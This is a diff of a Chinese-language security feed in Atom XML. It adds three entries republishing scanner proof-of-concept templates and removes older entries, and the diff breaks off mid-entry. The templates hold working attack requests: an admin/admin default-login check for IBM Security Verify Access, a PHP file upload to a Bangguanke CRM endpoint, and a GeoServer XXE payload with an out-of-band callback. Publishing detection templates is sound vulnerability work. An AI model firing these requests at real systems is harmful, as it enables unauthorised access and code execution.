@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-24T07:15:11.298Z</updated>
+  <updated>2025-06-24T07:45:47.106Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,86 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>IBM Security Verify Access 默认登录凭证漏洞</title>
+    <link href="http://example.com/2025/06/24/github_1437809060/"/>
+    <id>http://example.com/2025/06/24/github_1437809060/</id>
+    <published>2025-06-24T07:45:47.110Z</published>
+    <updated>2025-06-24T07:45:47.106Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> IBM Security Verify Access 默认登录凭证漏洞</p><p><strong>漏洞类型：</strong> 弱口令</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> IBM Security Verify Access 存在默认管理员凭证漏洞。未经身份验证的远程攻击者可利用此漏洞获取系统特权或管理员访问权限。</p><p><strong>产品厂商：</strong> IBM</p><p><strong>产品名称：</strong> IBM Security Verify Access</p><p><strong>搜索语法：</strong> title:”IBM Security Verify Access”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/f7e7aa832e529b4ecfd5ee145262e8bee0557a27/http%2Fdefault-logins%2Fibm%2Fibm-security-verify-default-login.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/f7e7aa832e529b4ecfd5ee145262e8bee0557a27/http%2Fdefault-logins%2Fibm%2Fibm-security-verify-default-login.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> ibm-security-verify-default-login<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> IBM Security Verify Access <span class="hljs-operator">-</span> Default Login<br>  <span class="hljs-params">author:</span> johnk3r<br>  <span class="hljs-params">severity:</span> high<br>  <span class="hljs-params">description:</span> |<br>    IBM Security Verify Access default admin credentials were discovered. An unauthenticated, remote attacker can exploit this gain privileged <span class="hljs-keyword">or</span> administrator access to the system.<br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.0</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:C<span class="hljs-operator">/</span>C:L<span class="hljs-operator">/</span>I:L<span class="hljs-operator">/</span>A:L<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">8.3</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">522</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">2</span><br>    <span class="hljs-params">shodan-query:</span> title:<span class="hljs-string">&quot;IBM Security Verify Access&quot;</span><br>  <span class="hljs-params">tags:</span> ibm,default-login<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/core/j_security_check</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br><br>        <span class="hljs-attr">j_username</span><span class="hljs-operator">=</span>&#123;&#123;username&#125;&#125;&amp;j_password<span class="hljs-operator">=</span>&#123;&#123;password&#125;&#125;&amp;commit<span class="hljs-operator">=</span>&amp;locale<span class="hljs-operator">=</span>en&amp;_method<span class="hljs-operator">=</span>PUT<br><br>    <span class="hljs-params">attack:</span> pitchfork<br>    <span class="hljs-params">payloads:</span><br>      <span class="hljs-params">username:</span><br>        <span class="hljs-operator">-</span> admin<br>      <span class="hljs-params">password:</span><br>        <span class="hljs-operator">-</span> admin<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;len(body) == 0&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;status_code == 302&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;contains(set_cookie, &#x27;LtpaToken2&#x27;)&quot;</span><br>        <span class="hljs-params">condition:</span> and<br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; IBM Security Verify Access 默认登录凭证漏洞&lt;/p&gt;</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="弱口令" scheme="http://example.com/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>帮管客CRM客户管理系统任意文件上传漏洞</title>
+    <link href="http://example.com/2025/06/24/github_1246826363/"/>
+    <id>http://example.com/2025/06/24/github_1246826363/</id>
+    <published>2025-06-24T07:45:32.222Z</published>
+    <updated>2025-06-24T07:45:32.218Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> 帮管客CRM客户管理系统任意文件上传漏洞</p><p><strong>漏洞类型：</strong> 文件上传</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> 帮管客CRM客户管理系统的&#x2F;index.php&#x2F;upload&#x2F;ajax_upload接口存在任意文件上传漏洞，攻击者可以利用此漏洞上传恶意文件，进而执行任意代码。</p><p><strong>产品厂商：</strong> 帮管客</p><p><strong>产品名称：</strong> 帮管客CRM客户管理系统</p><p><strong>来源：</strong> <a href="https://github.com/zan8in/afrog/blob/f8e9ceaa2547e2b8cf264a14e536995c41766d64/pocs%2Ftemp%2Fafrog-pocs%2Fvulnerability%2Fbangguanke-crm-ajax-upload-fileupload.yaml">https://github.com/zan8in/afrog/blob/f8e9ceaa2547e2b8cf264a14e536995c41766d64/pocs%2Ftemp%2Fafrog-pocs%2Fvulnerability%2Fbangguanke-crm-ajax-upload-fileupload.yaml</a></p><p><strong>类型：</strong> zan8in&#x2F;afrog:github commit</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> bangguanke-crm-ajax-upload-fileupload<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> 帮管客CRM客户管理系统-<span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>upload<span class="hljs-operator">/</span>ajax_upload接口存在任意文件上传漏洞<br>  <span class="hljs-params">author:</span> water<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-params">description:</span> |-<br>    帮管客CRM客户管理系统-<span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>upload<span class="hljs-operator">/</span>ajax_upload接口存在任意文件上传漏洞<br>  <span class="hljs-params">tags:</span> bangguanke,fileupload<br>  <span class="hljs-params">created:</span> <span class="hljs-number">2025</span><span class="hljs-symbol">/06/16</span><br><br><span class="hljs-params">set:</span><br>  <span class="hljs-params">rboundary:</span> randomLowercase(<span class="hljs-number">8</span>)<br>  <span class="hljs-params">randname:</span> randomLowercase(<span class="hljs-number">6</span>)<br><span class="hljs-params">rules:</span><br>  <span class="hljs-params">r0:</span><br>    <span class="hljs-params">request:</span><br>      <span class="hljs-params">method:</span> POST<br>      <span class="hljs-params">path:</span> <span class="hljs-symbol">/index.php/upload/ajax_upload</span><br>      <span class="hljs-params">headers:</span><br>        <span class="hljs-params">Content-Type:</span> multipart<span class="hljs-symbol">/form-data</span>; <span class="hljs-attr">boundary</span><span class="hljs-operator">=</span><span class="hljs-operator">-</span>---WebKitFormBoundary&#123;&#123;rboundary&#125;&#125;<br>      <span class="hljs-params">body:</span> <span class="hljs-string">&quot;------WebKitFormBoundary&#123;&#123;rboundary&#125;&#125;<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Disposition: form-data; name=<span class="hljs-char escape_">\&quot;</span>file<span class="hljs-char escape_">\&quot;</span>; filename=<span class="hljs-char escape_">\&quot;</span>&#123;&#123;randname&#125;&#125;.php<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Type: image/jpeg<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&lt;?php phpinfo();unlink(__FILE__);<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>------WebKitFormBoundary&#123;&#123;rboundary&#125;&#125;--<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span><br>    <span class="hljs-params">expression:</span> |<br>      response.status <span class="hljs-operator">==</span> <span class="hljs-number">302</span> <span class="hljs-operator">&amp;&amp;</span><br>      response.body.bcontains(b&#x27;\\u4e0a\\u4f20\\u6210\\u529f&#x27;)<br>    <span class="hljs-params">output:</span><br>      <span class="hljs-params">search:</span> &#x27;<span class="hljs-string">&quot;<span class="hljs-char escape_">\&quot;</span>url<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>(?P&lt;dir&gt;.+?)<span class="hljs-char escape_">\&quot;</span>&quot;</span>.bsubmatch(response.body)&#x27;<br>      <span class="hljs-params">dir:</span> replaceAll(search[<span class="hljs-string">&quot;dir&quot;</span>],<span class="hljs-string">&quot;<span class="hljs-char escape_">\\</span>&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<br><br>  <span class="hljs-params">r1:</span><br>    <span class="hljs-params">request:</span><br>      <span class="hljs-params">method:</span> GET<br>      <span class="hljs-params">path:</span> <span class="hljs-string">&quot;&#123;&#123;dir&#125;&#125;&quot;</span><br>    <span class="hljs-params">expression:</span> response.status <span class="hljs-operator">==</span> <span class="hljs-number">200</span> <span class="hljs-operator">&amp;&amp;</span> response.body.bcontains(b&#x27;PHP Extension&#x27;) <span class="hljs-operator">&amp;&amp;</span> response.body.bcontains(b&#x27;PHP Version&#x27;)<br><span class="hljs-params">expression:</span> r0() <span class="hljs-operator">&amp;&amp;</span> r1()<br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; 帮管客CRM客户管理系统任意文件上传漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞类</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="文件上传" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+    
+    <category term="zan8in/afrog:github commit" scheme="http://example.com/tags/zan8in-afrog-github-commit/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>GeoServer XXE 漏洞</title>
+    <link href="http://example.com/2025/06/24/github_1453237790/"/>
+    <id>http://example.com/2025/06/24/github_1453237790/</id>
+    <published>2025-06-24T07:45:18.703Z</published>
+    <updated>2025-06-24T07:45:18.701Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> GeoServer XXE 漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-30220</li></ul><p><strong>漏洞类型：</strong> XML实体注入</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> GeoServer是一个用Java编写的开源软件服务器，允许用户共享和编辑地理空间数据。该漏洞源于XML外部实体处理不当，可能导致信息泄露。</p><p><strong>产品厂商：</strong> GeoServer</p><p><strong>产品名称：</strong> GeoServer</p><p><strong>搜索语法：</strong> app&#x3D;”GeoServer”</p><p><strong>来源：</strong> <a href="https://github.com/zan8in/afrog/blob/f8e9ceaa2547e2b8cf264a14e536995c41766d64/pocs%2Ftemp%2Fafrog-pocs%2Fcve%2FCVE-2025-30220.yaml">https://github.com/zan8in/afrog/blob/f8e9ceaa2547e2b8cf264a14e536995c41766d64/pocs%2Ftemp%2Fafrog-pocs%2Fcve%2FCVE-2025-30220.yaml</a></p><p><strong>类型：</strong> zan8in&#x2F;afrog:github commit</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>5-<span class="hljs-number">30220</span><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> GeoServer XXE 漏洞<br>  <span class="hljs-params">author:</span> avic123<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-params">description:</span> |<br>    GeoServer是GeoServer开源的一个用 Java 编写的开源软件服务器。允许用户共享和编辑地理空间数据。GeoServer存在代码问题漏洞，该漏洞源于XML外部实体处理不当，可能导致信息泄露。<br>    fofa：app<span class="hljs-operator">=</span><span class="hljs-string">&quot;GeoServer&quot;</span><br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//mp.weixin.qq.com/s/9tEZR2xu_DX5a8cC_ZP_bw</span><br>  <span class="hljs-params">created:</span> <span class="hljs-number">2025</span><span class="hljs-symbol">/06/24</span><br><br><span class="hljs-params">set:</span><br>  <span class="hljs-params">oob:</span> oob()<br>  <span class="hljs-params">oobHTTP:</span> oob.HTTP<br>  <span class="hljs-params">hostname:</span> request.url.host<br><br><span class="hljs-params">rules:</span><br>  <span class="hljs-params">r0:</span><br>    <span class="hljs-params">request:</span><br>      <span class="hljs-params">method:</span> POST<br>      <span class="hljs-params">path:</span> <span class="hljs-symbol">/geoserver/wfs</span><br>      <span class="hljs-params">headers:</span><br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/xml</span><br>      <span class="hljs-params">body:</span> |-<br>        <span class="hljs-operator">&lt;</span>wfs:GetFeature service<span class="hljs-operator">=</span><span class="hljs-string">&quot;WFS&quot;</span> version<span class="hljs-operator">=</span><span class="hljs-string">&quot;1.0.0&quot;</span><br>        xmlns:wfs<span class="hljs-operator">=</span><span class="hljs-string">&quot;http://www.opengis.net/wfs&quot;</span><br>        xmlns:xsi<span class="hljs-operator">=</span><span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br>        xmlns:topp<span class="hljs-operator">=</span><span class="hljs-string">&quot;http://www.openplans.org/topp&quot;</span><br>        xsi:schemaLocation<span class="hljs-operator">=</span><span class="hljs-string">&quot;http://a &#123;&#123;oobHTTP&#125;&#125;/xxe.xsd&quot;</span><br>        <span class="hljs-attr">outputFormat</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;KML&quot;</span><span class="hljs-operator">&gt;</span><br>        <span class="hljs-operator">&lt;</span>wfs:Query typeName<span class="hljs-operator">=</span><span class="hljs-string">&quot;topp:states&quot;</span><span class="hljs-operator">/</span><span class="hljs-operator">&gt;</span><br>        <span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>wfs:GetFeature<span class="hljs-operator">&gt;</span><br>    <span class="hljs-params">expression:</span> response.status <span class="hljs-operator">==</span> <span class="hljs-number">200</span> <span class="hljs-operator">&amp;&amp;</span> oobCheck(oob, oob.ProtocolHTTP, <span class="hljs-number">3</span>)<br><br><span class="hljs-params">expression:</span> r0()<br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; GeoServer XXE 漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="zan8in/afrog:github commit" scheme="http://example.com/tags/zan8in-afrog-github-commit/"/>
+    
+    <category term="XML实体注入" scheme="http://example.com/tags/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
   
   <entry>
     <title>Github Poc</title>
@@ -468,85 +548,6 @@
     <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
     
     <category term="缓冲区溢出" scheme="http://example.com/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Github Poc</title>
-    <link href="http://example.com/2025/06/23/github_2020889463/"/>
-    <id>http://example.com/2025/06/23/github_2020889463/</id>
-    <published>2025-06-23T23:45:21.020Z</published>
-    <updated>2025-06-23T23:45:21.019Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> </p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2019-16928</li></ul><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/75a4879e169c84887376946599223d6780686ed2/network%2Fcves%2F2019%2FCVE-2019-16928.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/75a4879e169c84887376946599223d6780686ed2/network%2Fcves%2F2019%2FCVE-2019-16928.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs"><br><br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; &lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Exim Heap Buffer Overflow Vulnerability</title>
-    <link href="http://example.com/2025/06/23/github_3511826890/"/>
-    <id>http://example.com/2025/06/23/github_3511826890/</id>
-    <published>2025-06-23T23:45:14.619Z</published>
-    <updated>2025-06-23T23:45:14.614Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Exim Heap Buffer Overflow Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2019-16928</li></ul><p><strong>漏洞类型：</strong> 缓冲区溢出</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Exim 4.92至4.92.2版本中存在一个堆缓冲区溢出漏洞，位于string.c文件中的string_vformat函数，涉及长EHLO命令。远程攻击者可以通过发送特制的EHLO命令来执行任意代码。</p><p><strong>产品厂商：</strong> Exim</p><p><strong>产品名称：</strong> Exim</p><p><strong>影响版本：</strong> 4.92 &lt;&#x3D; version &lt;&#x3D; 4.92.2</p><p><strong>搜索语法：</strong> cpe:”cpe:2.3:a:exim:exim”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12169">https://github.com/projectdiscovery/nuclei-templates/issues/12169</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote><p>Exim 4.92 through 4.92.2 contains a remote code execution caused by a heap-based buffer overflow in string_vformat in string.c involving a long EHLO command, letting remote attackers execute arbitrary code, exploit requires sending a specially crafted EHLO command.</p></blockquote><h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><a href="http://www.openwall.com/lists/oss-security/2019/09/28/1">http://www.openwall.com/lists/oss-security/2019/09/28/1</a></li><li><a href="http://www.openwall.com/lists/oss-security/2019/09/28/2">http://www.openwall.com/lists/oss-security/2019/09/28/2</a></li></ul><h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: True</h4><h4 id="Shodan-Query-cpe-cpe-2-3-a-exim-exim"><a href="#Shodan-Query-cpe-cpe-2-3-a-exim-exim" class="headerlink" title="Shodan Query: cpe:&quot;cpe:2.3:a:exim:exim&quot;"></a>Shodan Query: <code>cpe:&quot;cpe:2.3:a:exim:exim&quot;</code></h4><blockquote><p>Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(<code>-debug</code>) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </p></blockquote><blockquote><p>Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</p></blockquote><p>You can check the FAQ for the Nuclei Templates Community Rewards Program <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md">here</a>.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Exim Heap Buffer Overflow Vulnerability</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="缓冲区溢出" scheme="http://example.com/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>TP-Link TL-WR940N/841N 命令注入漏洞</title>
-    <link href="http://example.com/2025/06/23/github_1007102895/"/>
-    <id>http://example.com/2025/06/23/github_1007102895/</id>
-    <published>2025-06-23T23:15:15.486Z</published>
-    <updated>2025-06-23T23:15:15.481Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> TP-Link TL-WR940N&#x2F;841N 命令注入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2023-33538</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> TP-Link TL-WR940N V2&#x2F;V4和TL-WR841N V8&#x2F;V10路由器中存在一个认证后的命令注入漏洞。该漏洞位于<code>WlanNetworkRpm.htm</code>中的<code>ssid1</code>参数，允许注入任意shell命令。攻击成功时，攻击者可以在设备上执行任意命令。</p><p><strong>产品厂商：</strong> TP-Link</p><p><strong>产品名称：</strong> TP-Link TL-WR940N&#x2F;TL-WR841N</p><p><strong>影响版本：</strong> TL-WR940N V2&#x2F;V4, TL-WR841N V8&#x2F;V10</p><p><strong>来源：</strong> <a href="https://github.com/mrowkoob/CVE-2023-33538-msf">https://github.com/mrowkoob/CVE-2023-33538-msf</a></p><p><strong>类型：</strong> CVE-2023:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li><li>tplink_ssid1_rce.rb</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2023-33538-–-TP-Link-TL-WR940N-841N-Command-Injection-Metasploit-module"><a href="#CVE-2023-33538-–-TP-Link-TL-WR940N-841N-Command-Injection-Metasploit-module" class="headerlink" title="CVE-2023-33538 – TP-Link TL-WR940N&#x2F;841N Command Injection (Metasploit module)"></a>CVE-2023-33538 – TP-Link TL-WR940N&#x2F;841N Command Injection (Metasploit module)</h2><p>This Metasploit <strong>auxiliary module</strong> targets an authenticated <strong>command injection vulnerability</strong> in TP-Link TL-WR940N V2&#x2F;V4 and TL-WR841N V8&#x2F;V10 routers.<br>The issue lies in the vulnerable <code>ssid1</code> parameter used in <code>WlanNetworkRpm.htm</code>, which allows injection of arbitrary shell commands.</p><p>When successful, it allows the attacker to execute arbitrary commands on the device.</p><p>More information about the CVE:<br><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-33538">https://nvd.nist.gov/vuln/detail/CVE-2023-33538</a></p><hr><h3 